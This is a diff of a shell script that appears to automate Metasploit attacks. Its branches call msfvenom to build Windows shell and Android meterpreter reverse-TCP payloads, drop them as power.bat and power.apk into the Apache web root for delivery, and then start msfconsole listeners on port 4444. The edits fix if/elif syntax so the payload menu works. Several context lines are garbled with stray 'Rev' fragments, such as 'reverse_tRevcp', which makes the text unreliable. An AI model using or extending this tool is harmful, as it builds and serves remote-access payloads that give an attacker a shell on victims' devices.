@@ -66,7 +66,7 @@ elif [ $resp1 = 1 ] && [ $resp2 = 2 ]; then
   echo "$done"
   payChoice = 12
 #Windows - Shell - Reverse_tcp
-if [ $resp1 = 1 ] && [ $resp2 = 3 ]; then
+elif [ $resp1 = 1 ] && [ $resp2 = 3 ]; then
   clear
   echo -e "$g Creating payload...$w"
   msfvenom -p windows/shell/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.bat
@@ -94,7 +94,7 @@ elif [ $resp1 = 2 ] && [ $resp2 = 2 ]; then
   echo "$done"
   payChoice = 22
 #Android - Meterpreter - Reverse_TCPRev
-elif [ $resp1 = 3 ] && [ $resp2 = 1 ]; thenRev
+elif [ $resp1 = 3 ] && [ $resp2 = 1 ]; then
   clearRev
   echo -e "$g Creating payload...$w"Rev
   msfvenom -p android/meterpreter/reverse_tRevcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.apk
@@ -121,7 +121,7 @@ service apache2 status
 echo -e "$g Starting the listener.. (this may take a while..)$w"
 cd rb
 if [ $payChoice = 0 ]; then
-  
+  exit 1
 elif [ $payChoice = 11 ]; then
   cd windows
   msfconsole -r ListenWindowsPowerRevTCP.rb
